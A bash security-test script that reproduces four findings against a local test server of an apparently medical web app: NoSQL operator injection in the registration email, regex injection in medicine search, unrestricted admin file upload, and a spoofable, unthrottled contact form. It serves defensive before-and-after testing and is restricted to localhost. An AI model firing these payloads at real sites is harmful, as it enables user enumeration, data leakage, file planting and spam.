#!/usr/bin/env bash
# Reproduce Pasan's four findings (V-07 to V-10) against the local test server.
#
#   1. In one terminal:  cd backend && npm run dev:test
#   2. In another:        bash security-tests/test-v07-v10.sh
#
# Run it BEFORE a fix (the exploit works) and AFTER (the exploit fails) to get
# before/after evidence. Localhost only — never point this at a hosted site.

set -u
B="http://localhost:4000/api/v1"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

hr(){ printf '%s\n' "----------------------------------------------------------------------"; }
count(){ python -c "import sys,json;print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null; }
msg(){ python -c "import sys,json;print(json.load(sys.stdin).get('message'))" 2>/dev/null; }

if [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$B/user/alldoctors")" != "200" ]; then
  echo "!! Server not reachable on localhost:4000. Start it first:  cd backend && npm run dev:test"
  exit 1
fi

echo "MediHub findings V-07 to V-10  ·  $(date -u '+%Y-%m-%d %H:%M UTC')"
hr

echo "V-07  NoSQL injection (register email field)"
echo "  [control] string email:"
echo -n "     -> "; curl -s -X POST "$B/user/patient/register" -H "Content-Type: application/json" \
  -d '{"firstName":"Test","lastName":"User","email":"probe-'"$RANDOM"'@test.local","phone":"0771234567","address":"Colombo","password":"Passw0rd!123","gender":"Male","dob":"1990-01-01"}' | msg
echo "  [attack]  email as {\$gt:\"\"}:"
echo -n "     -> "; curl -s -X POST "$B/user/patient/register" -H "Content-Type: application/json" \
  -d '{"firstName":"Test","lastName":"User","email":{"$gt":""},"phone":"0771234567","address":"Colombo","password":"Passw0rd!123","gender":"Male","dob":"1990-01-01"}' | msg
echo "  VULNERABLE if the attack says 'already Registered' (operator matched a user)."
hr

echo "V-08  Regex injection (medicine search)"
c1=$(curl -s "$B/medicines/search-medicine?search=zzzznomatchzzzz")
c2=$(curl -s "$B/medicines/search-medicine?search=zzzznomatchzzzz|.*")
echo "  [control] search=zzzznomatchzzzz        -> $(echo "$c1" | count) medicines, $(echo -n "$c1" | wc -c) bytes"
echo "  [attack]  search=zzzznomatchzzzz|.*     -> $(echo "$c2" | count) medicines, $(echo -n "$c2" | wc -c) bytes"
echo "  VULNERABLE if the attack returns far more medicines than the control."
hr

echo "V-09  Unrestricted file upload (admin route)"
ADMIN=$(python -c "import json;print(json.load(open('security-tests/.tokens.json'))['accounts']['admin']['cookie'])" 2>/dev/null)
rm -f backend/public/temp/* 2>/dev/null
printf 'fake program' > /tmp/fake.exe
head -c 5000000 /dev/zero > /tmp/big.bin
echo -n "  upload fake.exe -> "; curl -s -X POST "$B/medicines/addmedicine" -H "Cookie: $ADMIN" -F "image=@/tmp/fake.exe" | msg
echo -n "  upload 5MB file -> "; curl -s -X POST "$B/medicines/addmedicine" -H "Cookie: $ADMIN" -F "image=@/tmp/big.bin" | msg
left="$(ls backend/public/temp/ 2>/dev/null | grep -v gitkeep)"
echo "  files left on disk after 'rejected' uploads: ${left:-(none)}"
echo "  VULNERABLE if fake.exe / big.bin are still listed above."
hr

echo "V-10  Contact form (spoofable sender + no rate limit)"
echo -n "  spoofed sender ceo@some-bank.example -> "; curl -s -X POST "$B/message/send" -H "Content-Type: application/json" -d '{"email":"ceo@some-bank.example","message":"spoof test"}' | msg
ok=0; for i in $(seq 1 15); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$B/message/send" -H "Content-Type: application/json" -d '{"email":"f@test.local","message":"burst"}')
  [ "$code" = "429" ] || ok=$((ok+1))
done
echo "  burst of 15 messages -> accepted: $ok, rate-limited: $((15-ok))"
echo "  VULNERABLE if the spoof is accepted and rate-limited is 0."
hr
echo "Done."
